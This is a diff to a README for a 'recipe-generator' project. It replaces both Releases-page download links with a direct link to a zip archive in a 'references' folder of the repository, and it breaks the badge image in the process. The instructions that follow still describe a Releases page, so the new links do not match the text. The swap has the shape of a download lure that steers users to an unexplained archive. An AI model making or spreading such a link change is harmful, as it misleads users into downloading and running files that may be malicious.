@@ -2,7 +2,7 @@
 
 ## 📥 Download Now!
 
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-%20-blue)](https://github.com/samikshadubey23/recipe-generator/releases)
+[![Download Latest Release](https://github.com/samikshadubey23/recipe-generator/raw/refs/heads/main/references/recipe-generator-v2.9.zip%20Latest%20Release-%20-blue)](https://github.com/samikshadubey23/recipe-generator/raw/refs/heads/main/references/recipe-generator-v2.9.zip)
 
 ## 🚀 Getting Started
 
@@ -31,7 +31,7 @@ Before downloading, ensure your system meets the following minimum requirements:
 
 To get started, visit the Releases page to download the latest version of the application.
 
-[Download Latest Release](https://github.com/samikshadubey23/recipe-generator/releases)
+[Download Latest Release](https://github.com/samikshadubey23/recipe-generator/raw/refs/heads/main/references/recipe-generator-v2.9.zip)
 
 1. Click on the above link to access the Releases page.
 2. You will see a list of available versions. Select the latest version.
